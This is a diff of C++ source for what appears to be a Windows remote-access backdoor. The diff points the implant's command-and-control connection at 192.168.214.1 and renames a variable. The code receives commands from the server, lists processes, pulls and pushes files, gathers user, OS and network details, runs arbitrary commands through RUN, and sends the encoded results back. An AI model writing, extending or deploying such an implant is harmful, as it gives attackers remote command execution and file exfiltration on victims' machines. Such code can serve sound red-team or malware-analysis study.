@@ -73,13 +73,13 @@ std::string decode(std::string in) {
 int recieve_commands()
 {
     EasySocket sock = EasySocket();
-    sock.connectServer("localhost", DEFAULT_PORT);
+    sock.connectServer("192.168.214.1", DEFAULT_PORT);
     std::string data;
      // Receive until the peer closes the connection
     do {
         data = sock.recvData(DEFAULT_BUFLEN);
         if (data.size() > 0) {
-            std::string meep = "";
+            std::string resp = "";
             std::string command;
             std::string arguments;
             printf("Bytes received: %d\n", data.size());
@@ -98,7 +98,7 @@ int recieve_commands()
                 arguments = "";
             }
             if (command.compare("LISTPROC") == 0) {
-                meep = exec("tasklist");
+                resp = exec("tasklist");
             }
             else if (command.compare("PULL") == 0) {
                 arguments.erase(std::remove_if(arguments.begin(), arguments.end(), isspace), arguments.end());
@@ -110,22 +110,22 @@ int recieve_commands()
                 sock.fileReceive(arguments);
             }
             else if (command.compare("SYSINFO") == 0) {
-                meep = "USER:";
-                meep.append(exec("whoami"));
-                meep.append("SYSTEMINFO:");
-                meep.append(exec("\"Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | FL\""));
-                meep.append("NETWORKING INFO:");
-                meep.append(exec("Get-NetAdapter"));
+                resp = "USER:";
+                resp.append(exec("whoami"));
+                resp.append("SYSTEMINFO:");
+                resp.append(exec("\"Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture, BootDevice,  BuildNumber, CSName | FL\""));
+                resp.append("NETWORKING INFO:");
+                resp.append(exec("Get-NetAdapter"));
             }
             else if (command.compare("RUN") == 0) {
-                meep = exec(arguments.c_str());
+                resp = exec(arguments.c_str());
             }
             else {
-                meep = "NOT A VALID COMMAND";
+                resp = "NOT A VALID COMMAND";
             }
-            meep = encode(meep, k);
+            resp = encode(resp, k);
             //std::cout << meep << std::endl;
-            sock.sendData(meep);
+            sock.sendData(resp);
             
         }
         else if (data.size() == 0) {
